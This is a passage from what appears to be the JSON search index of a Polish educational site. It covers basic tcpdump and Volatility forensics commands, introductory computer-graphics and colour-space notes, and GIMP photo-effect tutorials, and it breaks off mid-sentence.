eth0\n</code></pre>"},{"location":"ethical-hacking/tools/tcpdump/#przechwytywanie-pakietow-tcp","title":"Przechwytywanie pakiet\u00f3w TCP","text":"<p>Tcpdump mo\u017cna skonfigurowa\u0107, aby przechwytywa\u0107 tylko okre\u015blone typy pakiet\u00f3w. Poni\u017csze polecenie przechwytuje tylko pakiety TCP:</p> <pre><code>tcpdump -i eth0 tcp\n</code></pre>"},{"location":"ethical-hacking/tools/tcpdump/#przechwytywanie-pakietow-odna-okreslonego-adresu-ip","title":"Przechwytywanie pakiet\u00f3w od/na okre\u015blonego adresu IP","text":"<p>Mo\u017cna r\u00f3wnie\u017c filtrowa\u0107 pakiety na podstawie adresu IP. Poni\u017csze polecenie przechwytuje tylko pakiety pochodz\u0105ce lub kieruj\u0105ce si\u0119 do adresu <code>192.168.1.100</code>:</p> <pre><code>tcpdump -i eth0 host 192.168.1.100\n</code></pre>"},{"location":"ethical-hacking/tools/tcpdump/#zapisywanie-i-odtwarzanie-ruchu-sieciowego","title":"Zapisywanie i odtwarzanie ruchu sieciowego","text":"<p>Tcpdump umo\u017cliwia zapisywanie przechwyconych pakiet\u00f3w do pliku, kt\u00f3ry mo\u017ce by\u0107 p\u00f3\u017aniej odtwarzany. Poni\u017csze polecenie zapisuje przechwycone pakiety do pliku <code>output.pcap</code>:</p> <pre><code>tcpdump -i eth0 -w output.pcap\n</code></pre> <p>Mo\u017cna p\u00f3\u017aniej odtworzy\u0107 przechwycony ruch z pliku za pomoc\u0105 polecenia:</p> <pre><code>tcpdump -r output.pcap\n</code></pre>"},{"location":"ethical-hacking/tools/tcpdump/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"ethical-hacking/tools/volatility/","title":"Volatility","text":"<p>Volatility to otwarto\u017ar\u00f3d\u0142owe narz\u0119dzie do analizy pami\u0119ci w systemach operacyjnych. Umo\u017cliwia ekstrakcj\u0119 informacji z obraz\u00f3w pami\u0119ci RAM, co jest cz\u0119sto u\u017cywane w forensyce cyfrowej podczas badania incydent\u00f3w bezpiecze\u0144stwa.</p> <p>Volatility analizuje obrazy pami\u0119ci RAM, umo\u017cliwiaj\u0105c badaczom odtworzenie dzia\u0142ania systemu w czasie bliskim incydentowi. Narz\u0119dzie to jest w stanie wydoby\u0107 wiele typ\u00f3w informacji, w tym list\u0119 proces\u00f3w, otwartych gniazd sieciowych, za\u0142adowanych modu\u0142\u00f3w j\u0105dra, plik\u00f3w cache, zawarto\u015bci bufora i wiele innych.</p> <p>Volatility</p>"},{"location":"ethical-hacking/tools/volatility/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/volatility/#wyswietlenie-listy-procesow","title":"Wy\u015bwietlenie listy proces\u00f3w","text":"<p>Aby wy\u015bwietli\u0107 list\u0119 proces\u00f3w z obrazu pami\u0119ci, mo\u017cna u\u017cy\u0107 polecenia <code>pslist</code>:</p> <pre><code>volatility -f memorydump.raw --profile=Win7SP1x64 pslist\n</code></pre>"},{"location":"ethical-hacking/tools/volatility/#wyswietlenie-otwartych-gniazd-sieciowych","title":"Wy\u015bwietlenie otwartych gniazd sieciowych","text":"<p>Aby wy\u015bwietli\u0107 otwarte gniazda sieciowe, mo\u017cna u\u017cy\u0107 polecenia <code>sockets</code>:</p> <pre><code>volatility -f memorydump.raw --profile=Win7SP1x64 sockets\n</code></pre>"},{"location":"ethical-hacking/tools/volatility/#wyswietlenie-zawartosci-bufora","title":"Wy\u015bwietlenie zawarto\u015bci bufora","text":"<p>Aby wy\u015bwietli\u0107 zawarto\u015b\u0107 bufora dla konkretnego procesu, mo\u017cna u\u017cy\u0107 polecenia <code>procdump</code>:</p> <pre><code>volatility -f memorydump.raw --profile=Win7SP1x64 procdump -p 1234 -D dump/\n</code></pre> <p>W powy\u017cszym przyk\u0142adzie \\(1234\\) to identyfikator procesu (PID), a <code>dump/</code> to katalog, w kt\u00f3rym zostanie zapisany zrzut procesu.</p>"},{"location":"graphics/","title":"Grafika komputerowa","text":"<p>Grafika komputerowa odnosi si\u0119 do tworzenia, reprezentowania, przetwarzania i manipulowania obrazami za pomoc\u0105 komputera. W dzisiejszych czasach jest to kluczowa dziedzina w wielu sektorach, od projektowania graficznego, przez gry komputerowe, po medycyn\u0119 i badania naukowe.</p>"},{"location":"graphics/#podstawowe-pojecia","title":"Podstawowe poj\u0119cia","text":"<ol> <li>Piksel: najmniejsza jednostka obrazu wy\u015bwietlanego na ekranie, kt\u00f3ra ma okre\u015blony kolor.</li> <li>Rozdzielczo\u015b\u0107: okre\u015bla liczb\u0119 pikseli na d\u0142ugo\u015b\u0107 i szeroko\u015b\u0107 obrazu lub ekranu.</li> <li>Paleci kolor\u00f3w: zestaw kolor\u00f3w dost\u0119pnych dla obrazu. W systemie 24-bitowym mo\u017cemy reprezentowa\u0107 ponad 16 milion\u00f3w kolor\u00f3w.</li> <li>Wektor vs. bitmapa: obrazy wektorowe s\u0105 tworzone za pomoc\u0105 geometrycznych kszta\u0142t\u00f3w, podczas gdy obrazy bitmapowe s\u0105 tworzone za pomoc\u0105 siatki pikseli.</li> </ol>"},{"location":"graphics/#klasyfikacja","title":"Klasyfikacja","text":"<ol> <li>2D Grafika komputerowa: odnosi si\u0119 do tworzenia obraz\u00f3w w dw\u00f3ch wymiarach. Przyk\u0142ady: projektowanie graficzne, edycja zdj\u0119\u0107.</li> <li>3D Grafika komputerowa: odnosi si\u0119 do tworzenia obraz\u00f3w w trzech wymiarach. Przyk\u0142ady: animacje, gry komputerowe, symulacje.</li> </ol>"},{"location":"graphics/#technologie-i-algorytmy","title":"Technologie i algorytmy","text":"<ul> <li>Modele o\u015bwietlenia: s\u0142u\u017c\u0105 do symulowania, jak \u015bwiat\u0142o wchodzi w interakcj\u0119 z obiektami.</li> <li>Teksturowanie: technika nadawania powierzchniom wygl\u0105du i faktury.</li> <li>Cieniowanie: proces okre\u015blania koloru piksela na podstawie \u015bwiat\u0142a i materia\u0142u.</li> <li>Ray tracing: technika renderowania, kt\u00f3ra symuluje \u015bcie\u017ck\u0119 promienia \u015bwiat\u0142a przez scen\u0119.</li> <li>Grafika rastrowa: obrazy s\u0105 reprezentowane jako zestaw punkt\u00f3w w siatce.</li> </ul>"},{"location":"graphics/#przykadowe-oprogramowanie","title":"Przyk\u0142adowe oprogramowanie","text":"<ol> <li>Edytory grafiki rastrowej: Photoshop, GIMP.</li> <li>Edytory grafiki wektorowej: Adobe Illustrator, CorelDRAW.</li> <li>Oprogramowanie do modelowania 3D: Blender, Maya, 3DS Max.</li> </ol>"},{"location":"graphics/#zastosowania","title":"Zastosowania","text":"<ul> <li>Projektowanie graficzne: tworzenie wizualnych komunikat\u00f3w, takich jak plakaty, ulotki.</li> <li>Animacja: tworzenie ruchomych obraz\u00f3w, zar\u00f3wno 2D, jak i 3D.</li> <li>Gry komputerowe: tworzenie \u015brodowisk, postaci i efekt\u00f3w specjalnych.</li> <li>Wizualizacje naukowe: reprezentowanie skomplikowanych danych w formie wizualnej.</li> <li>Medycyna: wizualizacja i analiza obraz\u00f3w medycznych.</li> </ul>"},{"location":"graphics/#wyzwania-i-przyszosc","title":"Wyzwania i przysz\u0142o\u015b\u0107","text":"<p>Rozw\u00f3j technologii grafiki komputerowej jest nierozerwalnie zwi\u0105zany z post\u0119pem w dziedzinie sprz\u0119tu komputerowego. Coraz bardziej zaawansowane karty graficzne i technologie wy\u015bwietlania, takie jak VR (wirtualna rzeczywisto\u015b\u0107) czy AR (rozszerzona rzeczywisto\u015b\u0107), otwieraj\u0105 nowe mo\u017cliwo\u015bci dla projektant\u00f3w, artyst\u00f3w i in\u017cynier\u00f3w.</p>"},{"location":"graphics/#prezentacja","title":"Prezentacja","text":"<p>Kr\u00f3tkie wprowadzenie do grafiki komputerowej w formie prezentacji.</p> <p> Grafika rastrowa i wektorowa</p>"},{"location":"graphics/color-space/","title":"Przestrze\u0144 kolor\u00f3w w grafice komputerowej","text":"<p>Przestrze\u0144 kolor\u00f3w to matematyczny model opisuj\u0105cy spos\u00f3b reprezentowania kolor\u00f3w za pomoc\u0105 zestawu liczb, zwykle trzech lub czterech sk\u0142adnik\u00f3w. W grafice komputerowej, zrozumienie r\u00f3\u017cnych przestrzeni kolor\u00f3w jest kluczowe dla poprawnego przechowywania, przetwarzania i wy\u015bwietlania obraz\u00f3w.</p>"},{"location":"graphics/color-space/#podstawowe-przestrzenie-kolorow","title":"Podstawowe przestrzenie kolor\u00f3w","text":"<ol> <li>RGB (Red, Green, Blue)</li> <li>Najcz\u0119\u015bciej stosowana przestrze\u0144 kolor\u00f3w w grafice komputerowej, opieraj\u0105ca si\u0119 na trzech podstawowych sk\u0142adnikach \u015bwiat\u0142a: czerwonym, zielonym i niebieskim.</li> <li> <p>Zastosowanie: monitory, telewizory, skanery, aparaty cyfrowe.</p> </li> <li> <p>CMYK (Cyan, Magenta, Yellow, Key/Black)</p> </li> <li>U\u017cywa czterech kolor\u00f3w atramentu.</li> <li> <p>Zastosowanie: druk w kolorze.</p> </li> <li> <p>HSV/HSL (Hue, Saturation, Value/Lightness)</p> </li> <li>Reprezentacja kolor\u00f3w za pomoc\u0105 ich odcienia, nasycenia i jasno\u015bci.</li> <li> <p>Zastosowanie: edycja graficzna, analiza i przetwarzanie obraz\u00f3w.</p> </li> <li> <p>YUV</p> </li> <li>Oddziela informacje o jasno\u015bci (Y) od informacji o kolorze (UV).</li> <li> <p>Zastosowanie: telewizja, kompresja wideo.</p> </li> <li> <p>Lab</p> </li> <li>Ludzkie oko postrzega kolory w spos\u00f3b, kt\u00f3ry r\u00f3\u017cni si\u0119 od czysto fizycznych sk\u0142adnik\u00f3w \u015bwiat\u0142a; przestrze\u0144 Lab stara si\u0119 przybli\u017cy\u0107 ludzki spos\u00f3b postrzegania kolor\u00f3w.</li> <li>Zastosowanie: analiza i przetwarzanie obraz\u00f3w, druk.</li> </ol>"},{"location":"graphics/color-space/#konwersja-pomiedzy-przestrzeniami","title":"Konwersja pomi\u0119dzy przestrzeniami","text":"<p>Przekszta\u0142canie kolor\u00f3w z jednej przestrzeni do innej nierzadko wi\u0105\u017ce si\u0119 z pewnymi utratami. Na przyk\u0142ad konwersja z RGB do CMYK mo\u017ce nie by\u0107 jednoznaczna, poniewa\u017c przestrzenie te nie pokrywaj\u0105 si\u0119 dok\u0142adnie (nie wszystkie kolory RGB mog\u0105 by\u0107 dok\u0142adnie oddane w CMYK).</p>"},{"location":"graphics/color-space/#gebokosc-kolorow","title":"G\u0142\u0119boko\u015b\u0107 kolor\u00f3w","text":"<p>Dotyczy liczby bit\u00f3w u\u017cywanych do reprezentowania koloru ka\u017cdego piksela. Na przyk\u0142ad:</p> <ul> <li>8-bit: 256 kolor\u00f3w</li> <li>16-bit: 65,536 kolor\u00f3w</li> <li>24-bit: ponad 16 milion\u00f3w kolor\u00f3w (prawdziwe kolory)</li> <li>32-bit: ponad 16 milion\u00f3w kolor\u00f3w plus kana\u0142 alfa do przezroczysto\u015bci</li> </ul>"},{"location":"graphics/color-space/#przestrzenie-kolorow-a-kalibracja","title":"Przestrzenie kolor\u00f3w a kalibracja","text":"<p>Dla profesjonalist\u00f3w z bran\u017cy graficznej kluczowe jest, aby kolory na ekranie monitora by\u0142y wiernie oddane w stosunku do orygina\u0142u lub druku. Dlatego kalibracja monitora i stosowanie odpowiednich profil\u00f3w ICC jest tak wa\u017cne.</p>"},{"location":"graphics/color-space/#prezentacja","title":"Prezentacja","text":"<p>Kr\u00f3tka prezentacja na temat przestrzeni kolor\u00f3w.</p> <p> Przestrzenie kolor\u00f3w</p>"},{"location":"graphics/gimp/","title":"Gimp","text":""},{"location":"graphics/gimp/#gry","title":"Gry","text":"<p>Ciekawe gry do \u0107wiczenia zagadnie\u0144 zwi\u0105zanych z grafik\u0105:</p> <p>Hex Invaders</p> <p>Pixact.ly</p>"},{"location":"graphics/gimp/tutorials/","title":"Gimp - tutoriale","text":""},{"location":"graphics/gimp/tutorials/#wstep","title":"Wst\u0119p","text":"<p>Do eksperymentowania polecam korzysta\u0107 z darmowej biblioteki zdj\u0119\u0107, np. https://cc0.photo/ lub https://www.pexels.com/.</p>"},{"location":"graphics/gimp/tutorials/color-reveal/","title":"Wyr\u00f3\u017cnienie elementu","text":"<p>Opracowano na podstawie: http://boitblog.blogspot.com/2013/12/reveal-color-of-selected-object-in-image.html</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#wstep","title":"Wst\u0119p","text":"<p>W dzisiejszym \u015bwiecie, gdzie jeste\u015bmy zasypywani obrazami z ka\u017cdej strony, wyj\u0105tkowo wa\u017cne jest, aby nasze zdj\u0119cia mog\u0142y si\u0119 wyr\u00f3\u017cni\u0107. Dlatego stosowanie pewnych technik i efekt\u00f3w mo\u017ce okaza\u0107 si\u0119 niezwykle przydatne, szczeg\u00f3lnie je\u015bli chodzi o tworzenie efektywnych reklam produkt\u00f3w. Jednym z takich efekt\u00f3w jest technika zwana \"selective color\" lub \"color splash\", polegaj\u0105ca na zamianie zdj\u0119cia na czarno-bia\u0142e, podczas gdy wybrany element zostaje w oryginalnym, kolorowym wydaniu.</p> <p>Ta technika polega na konwersji wi\u0119kszo\u015bci zdj\u0119cia na czarno-bia\u0142e, pozostawiaj\u0105c tylko jedn\u0105 lub kilka cz\u0119\u015bci obrazu w kolorze. Mo\u017ce to by\u0107 konkretny obiekt, osoba, czy cho\u0107by fragment t\u0142a. W ten spos\u00f3b kolorowy element staje si\u0119 centralnym punktem uwagi, przyci\u0105gaj\u0105c oko widza i podkre\u015blaj\u0105c szczeg\u00f3ln\u0105 wa\u017cno\u015b\u0107 tego elementu.</p> <p>Efekt ten dzia\u0142a szczeg\u00f3lnie dobrze, gdy wybrany element na zdj\u0119ciu ma \u017cywe i jaskrawe kolory. Dzi\u0119ki kontrastowi z reszt\u0105 obrazu, wyr\u00f3\u017cniony element zyskuje na intensywno\u015bci i dynamice, czyni\u0105c ca\u0142e zdj\u0119cie znacznie bardziej intryguj\u0105cym.</p> <p>To, co sprawia, \u017ce efekt ten jest tak efektywny, to jego zdolno\u015b\u0107 do skupienia uwagi widza na konkretnej cz\u0119\u015bci obrazu. W reklamie produktu mo\u017cemy na przyk\u0142ad u\u017cy\u0107 tej techniki, aby skierowa\u0107 uwag\u0119 widza na produkt, kt\u00f3ry chcemy sprzeda\u0107, pozostawiaj\u0105c wszystko inne na zdj\u0119ciu w odcieniach szaro\u015bci. Dzi\u0119ki temu nasz produkt stanie si\u0119 centralnym punktem ca\u0142ego obrazu, przyci\u0105gaj\u0105c uwag\u0119 i zapadaj\u0105c w pami\u0119\u0107 widza. To pozwala nie tylko na efektywn\u0105 prezentacj\u0119 produktu, ale tak\u017ce na stworzenie mocnego i pami\u0119tnego obrazu marki.</p> <p>W tutorialu skorzystamy z nast\u0119puj\u0105cego zdj\u0119cia:</p> <p></p>"},{"location":"graphics/gimp/tutorials/color-reveal/#tworzymy-wersje-czarno-biaa","title":"Tworzymy wersj\u0119 czarno-bia\u0142\u0105","text":"<p>Najpierw stworzymy wersj\u0119 naszego zdj\u0119cia w odcieniach szaro\u015bci.</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#1-duplikujemy-warstwe","title":"1. Duplikujemy warstw\u0119","text":"<p>Wybieramy menu Warstwa-&gt;Powiel warstw\u0119 lub u\u017cywamy skr\u00f3tu Shift+Ctrl+D. Klikamy prawym przyciskiem myszy na nowej warstwie i wybieramy Modyfikuj atrybuty warstwy.... Zmieniamy nazw\u0119 naszej warstwy na Szara i zatwierdzamy.</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#2-desaturacja","title":"2. Desaturacja","text":"<p>Zaznaczamy warstw\u0119 Szara i wybieramy menu Kolory-&gt;Desaturacja-&gt;Desaturacja.... Jako tryb wybieramy Jasno\u015b\u0107 (HSL) i zatwierdzamy.</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#3-poprawiamy-jasnosc-i-kontrast","title":"3. Poprawiamy jasno\u015b\u0107 i kontrast","text":"<p>Dostosowujemy jasno\u015b\u0107 i kontrast czarno-bia\u0142ego zdj\u0119cia tak, by wygl\u0105da\u0142o na bardziej wyprane i wyblak\u0142e. W tym celu wybieramy menu Kolory-&gt;Jasno\u015b\u0107 i kontrast.... Zwi\u0119kszamy jasno\u015b\u0107, np. do \\(50\\) i zmniejszamy kontrast, np. do \\(-15\\).</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#wyrozniamy-element","title":"Wyr\u00f3\u017cniamy element","text":"<p>Mamy ju\u017c czarno-bia\u0142e zdj\u0119cie. Teraz pora uwidoczni\u0107 oryginalny kolor wybranego elementu. Elementem, kt\u00f3ry wyr\u00f3\u017cnimy, b\u0119dzie jab\u0142ko.</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#zaznaczamy-element","title":"Zaznaczamy element","text":"<p>Korzystaj\u0105c z narz\u0119dzi zaznaczania, np. Odr\u0119czne zaznaczanie obszar\u00f3w, zaznaczamy element zdj\u0119cia, kt\u00f3ry chcemy wyr\u00f3\u017cni\u0107. Im dok\u0142adniej to zrobimy, tym lepszy efekt uzyskamy.</p> <p>Info</p> <p>Dla u\u0142atwienia pracy mo\u017cemy tymczasowo ukry\u0107 warstw\u0119 Szara klikaj\u0105c przy niej ikonk\u0119 oka.</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#zmiekczamy-zaznaczenie","title":"Zmi\u0119kczamy zaznaczenie","text":"<p>Gdy ju\u017c jeste\u015bmy zadowoleni z naszego zaznaczenia, warto je delikatnie zmi\u0119kczy\u0107. W tym celu wybieramy menu Zaznaczenie-&gt;Zmi\u0119kcz... i ustawiamy np. \\(2 px\\).</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#dodajemy-kana-alfa","title":"Dodajemy kana\u0142 alfa","text":"<p>Zanim b\u0119dziemy mogli wyci\u0105\u0107 nasze zaznaczenie i tym samym zrobi\u0107 dziur\u0119 w warstwie, musimy najpierw doda\u0107 kana\u0142 alfa do naszej warstwy. Zaznaczamy warstw\u0119 Szara i wybieramy Warstwa-&gt;Przezroczysto\u015b\u0107-&gt;Dodaj kana\u0142 alfa.</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#wycinamy-zaznaczenie","title":"Wycinamy zaznaczenie","text":"<p>Teraz przysz\u0142a pora na u\u017cycie hipotetycznych no\u017cyczek. Wybieramy menu Edycja-&gt;Wyczy\u015b\u0107 albo u\u017cywamy przycisku Delete. Nast\u0119pnie czy\u015bcimy zaznaczenie (menu Zaznaczenie-&gt;Brak lub skr\u00f3t Shift+Ctrl+A).</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#poprawiamy-kolory","title":"Poprawiamy kolory","text":"<p>Na koniec warto jeszcze bardziej podkre\u015bli\u0107 wyr\u00f3\u017cniony element. W tym celu wybieramy menu Kolory-&gt;Barwa i nasycenie... i zmniejszamy jasno\u015b\u0107, np. na \\(-15\\).</p>"},{"location":"graphics/gimp/tutorials/color-reveal/#efekt-koncowy","title":"Efekt ko\u0144cowy","text":""},{"location":"graphics/gimp/tutorials/exploding-planet/","title":"Eksploduj\u0105ca planeta","text":"<p>Opracowano na podstawie: https://www.gimpusers.com/tutorials/exploding-planet.html</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#wstep","title":"Wst\u0119p","text":"<p>W tym tutorialu stworzymy efekt eksploduj\u0105cej planety. Efekt ten polega na rozerwaniu planety na kawa\u0142ki, kt\u00f3re wydaj\u0105 si\u0119 unosi\u0107 w powietrzu. Jest to ciekawy i dynamiczny efekt, kt\u00f3ry mo\u017ce by\u0107 wykorzystany w wielu r\u00f3\u017cnych projektach graficznych, takich jak plakaty, ok\u0142adki album\u00f3w, czy ilustracje.</p> <p>Na pocz\u0105tek b\u0119dziemy potrzebowali grafiki przedstawiaj\u0105cej pop\u0119kan\u0105 ziemi\u0119. W tutorialu skorzystamy z nast\u0119puj\u0105cego zdj\u0119cia:</p> <p></p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#tworzymy-planete","title":"Tworzymy planet\u0119","text":"<p>Na pocz\u0105tek zaczniemy od przekszta\u0142cenia naszej grafiki w co\u015b bardziej przypominaj\u0105cego planet\u0119.</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#przycinamy-zdjecie","title":"Przycinamy zdj\u0119cie","text":"<p>Zaczniemy od przyci\u0119cia zdj\u0119cia do kwadratu, aby uzyska\u0107 bardziej symetryczny kszta\u0142t planety.  W tym celu wybieramy narz\u0119dzie kadrowanie (Shift+C). W opcjach narz\u0119dzia ustawiamy sta\u0142e proporcje i wybieramy proporcje \\(1:1\\). Nast\u0119pnie rysujemy kwadrat zawieraj\u0105cy interesuj\u0105cy nas obszar i zatwierdzamy przyciskiem enter.</p> <p>Po tej operacji nale\u017cy dostosowa\u0107 wymiary warstwy do wymiar\u00f3w obrazu. W tym celu wybieramy menu Warstwa-&gt;Dopasuj warstw\u0119 do wymiar\u00f3w obrazu.</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#skalujemy-zdjecie","title":"Skalujemy zdj\u0119cie","text":"<p>Aby uzyska\u0107 lepszy efekt, warto przeskalowa\u0107 zdj\u0119cie do mniejszego rozmiaru. W tym celu wybieramy menu Obraz-&gt;Skaluj obraz.... W polu Szeroko\u015b\u0107 i Wysoko\u015b\u0107 wpisujemy np. \\(500\\) pikseli. Zatwierdzamy przyciskiem Skaluj.</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#przeksztacenie-w-planete","title":"Przekszta\u0142cenie w planet\u0119","text":"<p>Teraz przekszta\u0142cimy nasze zdj\u0119cie w planet\u0119. W tym celu wybieramy menu Filtry-&gt;Odwzorowanie-&gt;Odwzorowanie obiektu.... Jako obiekt docelowy wybieramy Sfera. Zaznaczmy opcj\u0119 Przezroczyste t\u0142o. W zak\u0142adce \u015awiat\u0142o ustawiamy Typ \u017ar\u00f3d\u0142a \u015bwiat\u0142a na Bez \u015bwiat\u0142a. Zatwierdzamy przyciskiem OK.</p> <p>Powinni\u015bmy otrzyma\u0107 now\u0105 warstw\u0119 z nasz\u0105 planet\u0105.</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#tworzymy-czarne-to","title":"Tworzymy czarne t\u0142o","text":"<p>Na pocz\u0105tek ustawmy aktywny kolor pierwszoplanowy na czarny. Teraz tworzymy now\u0105 warstw\u0119, kt\u00f3r\u0105 nazwiemy T\u0142o. Ustawiamy jej wype\u0142nienie na kolor pierwszoplanowy i przesuwamy j\u0105 pod warstw\u0119 z planet\u0105.</p> <p>Na tym etapie powinni\u015bmy mie\u0107 co\u015b takiego:</p> <p></p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#tworzymy-efekt-wybuchu","title":"Tworzymy efekt wybuchu","text":"<p>Mamy ju\u017c nasz\u0105 planet\u0119. Czas sprawi\u0107, by wygl\u0105da\u0142a, jakby eksplodowa\u0142a.</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#odwracamy-kolory","title":"Odwracamy kolory","text":"<p>Na pocz\u0105tek odwr\u00f3\u0107my kolory naszej planety, tak by czarne przerwy mi\u0119dzy fragmentami ziemi sta\u0142y si\u0119 bia\u0142e. W tym celu wybieramy menu Kolory-&gt;Odwr\u00f3\u0107.</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#spaszczamy","title":"Sp\u0142aszczamy","text":"<p>W celu uzyskania efektu eksplozji, musimy przygotowa\u0107 nasz obrazek. Wybieramy menu Filtry-&gt;Zniekszta\u0142cenia-&gt;Wsp\u00f3\u0142rz\u0119dne polarne. Odznaczamy opcj\u0119 to polar i zatwierdzamy przyciskiem OK.</p> <p>Powinni\u015bmy otrzyma\u0107 co\u015b takiego:</p> <p></p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#dodajemy-efekt-wiatru","title":"Dodajemy efekt wiatru","text":"<p>W celu uzyskania efektu unoszenia si\u0119 fragment\u00f3w planety, dodamy efekt wiatru. Wybieramy menu Filtry-&gt;Zniekszta\u0142cenia-&gt;Wiatr.... Ustawiamy Teshold na \\(5\\) i Strength na odpowiednio du\u017c\u0105 warto\u015b\u0107, np. \\(40\\). Styl efektu (Style) ustawiamy na Wind. Kierunek wiatru (Direction) ustawiamy na Bottom. Opcj\u0119 Edge Affected ustawiamy na Leading. Zatwierdzamy przyciskiem OK.</p> <p>Stosujemy efekt ponownie u\u017cywaj\u0105c skr\u00f3tu Ctrl+F.</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#przywracamy-wyglad-planety","title":"Przywracamy wygl\u0105d planety","text":"<p>Teraz przysz\u0142a pora na u\u017cycie efektu odwrotnego do tego, kt\u00f3ry zastosowali\u015bmy wcze\u015bniej. Wybieramy menu Filtry-&gt;Zniekszta\u0142cenia-&gt;Wsp\u00f3\u0142rz\u0119dne polarne. Tym razem zaznaczamy opcj\u0119 to polar i zatwierdzamy przyciskiem OK.</p> <p>Powinni\u015bmy na tym etapie otrzyma\u0107 co\u015b takiego:</p> <p></p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#zmieniamy-kolory","title":"Zmieniamy kolory","text":"<p>Czas na ostatni etap, czyli nadanie odpowiednich kolor\u00f3w. Wybieramy narz\u0119dzie Gradient (G). W opcjach narz\u0119dzia szukamy czarno-czerwono-\u017c\u00f3\u0142tego gradientu o nazwie Incandescent. Ustawiamy go tak, aby czarny kolor by\u0142 z prawej strony (przycisk Odwr\u00f3cenie).</p> <p>Teraz wybieramy menu Kolory-&gt;Odwzorowania-&gt;Odwzorowanie gradientu.</p>"},{"location":"graphics/gimp/tutorials/exploding-planet/#efekt-koncowy","title":"Efekt ko\u0144cowy","text":""},{"location":"graphics/gimp/tutorials/vintage-effect/","title":"Efekt vintage","text":"<p>Opracowano na podstawie http://www.gimpology.com/submission/view/authentic_vintage_effect.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#wstep","title":"Wst\u0119p","text":"<p>Efekt vintage to technika przetwarzania obrazu, kt\u00f3ra nadaje zdj\u0119ciom charakterystycznego wygl\u0105du przypominaj\u0105cego zdj\u0119cia z dawnych lat. Ten styl ma za zadanie przenosi\u0107 widza w czasie, ewokuj\u0105c nostalgiczn\u0105 atmosfer\u0119 lat 50., 60., czy 70. XX wieku.</p> <p>Dzi\u0119ki wykorzystaniu odpowiednich filtr\u00f3w i technik postprodukcji, efekt vintage mo\u017ce skutecznie zmieni\u0107 klasyczne zdj\u0119cia w obrazy pe\u0142ne stylu retro. Na pierwszy rzut oka, zdj\u0119cia te mog\u0105 wygl\u0105da\u0107, jakby by\u0142y wyblak\u0142e przez czas, z nasyconymi, ale nieco zmniejszonymi kontrastami kolor\u00f3w.</p> <p>Efekt vintage zdecydowanie najlepiej prezentuje si\u0119 na zdj\u0119ciach z intensywnymi, \u017cywymi kolorami - na przyk\u0142ad b\u0142\u0119kitnym niebem, soczyst\u0105 zieleni\u0105 trawy czy jaskrawymi barwami kwiat\u00f3w. Kontrast pomi\u0119dzy tymi \u017cywymi barwami a retro estetyk\u0105 nadaje zdj\u0119ciom unikalny, atrakcyjny charakter.</p> <p>Niezale\u017cnie od tego, czy efekt vintage jest stosowany do portret\u00f3w, zdj\u0119\u0107 krajobrazowych czy zdj\u0119\u0107 z \u017cycia codziennego, dodaje on g\u0142\u0119bi i atmosfery, tworz\u0105c ciekawy kontrast mi\u0119dzy nowoczesnymi elementami a klasyk\u0105 dawnych lat. Efekt ten jest nie tylko estetycznie przyjemny, ale tak\u017ce pozwala na eksperymentowanie i kreatywne wyra\u017canie si\u0119 poprzez fotografi\u0119, przekszta\u0142caj\u0105c codzienne sceny w obrazy, kt\u00f3re wydaj\u0105 si\u0119 opowiada\u0107 w\u0142asne, stare historie.</p> <p>W tutorialu skorzystamy z nast\u0119puj\u0105cego zdj\u0119cia:</p> <p></p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#dostosowanie-kolorow","title":"Dostosowanie kolor\u00f3w","text":"<p>Na pocz\u0105tek zaczniemy od dostosowania kolor\u00f3w zdj\u0119cia. Poniewa\u017c ka\u017cde zdj\u0119cie jest unikalne, warto poeksperymentowa\u0107 z om\u00f3wionymi tutaj ustawieniami. Naszym celem b\u0119dzie zwi\u0119kszenie kontrastu, nasycenia i dostosowanie krzywych kolor\u00f3w.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#1-zwiekszamy-kontrast","title":"1. Zwi\u0119kszamy kontrast","text":"<p>Wybieramy menu Kolory-&gt;Jasno\u015b\u0107 i kontrast i zwi\u0119kszamy kontrast, np. \\(+20\\).</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#2-zwiekszamy-nasycenie","title":"2. Zwi\u0119kszamy nasycenie","text":"<p>Wybieramy menu Kolory-&gt;Barwa i nasycenie. Zwi\u0119kszamy nasycenie, np. \\(+20\\). Warto tak\u017ce dostosowa\u0107 barw\u0119, np. \\(-10\\).</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#3-dostosowujemy-krzywe-kolorow","title":"3. Dostosowujemy krzywe kolor\u00f3w","text":"<p>Wybieramy menu Kolory-&gt;Krzywe. Z menu rozwijanego wybieramy po kolei ka\u017cdy kana\u0142: czerwony, zielony i niebieski. Ka\u017cd\u0105 krzyw\u0105 dostosowujemy indywidualnie.</p>"},{"location":"graphics/gimp/tutorials/vintage-effect/#4-zmniejszamy-nasycenie","title":"4. Zmniejszamy nasycenie","text":"<p>Ponownie wybieramy menu Kolory-&gt;Barwa i nasycenie. Tym razem zmniejszamy nasycenie, np. \\(-30\\). Mo\u017cemy tak\u017ce delikatnie zwi\u0119kszy\u0107 jasno\u015b\u0107 i zmniejszy\u0107 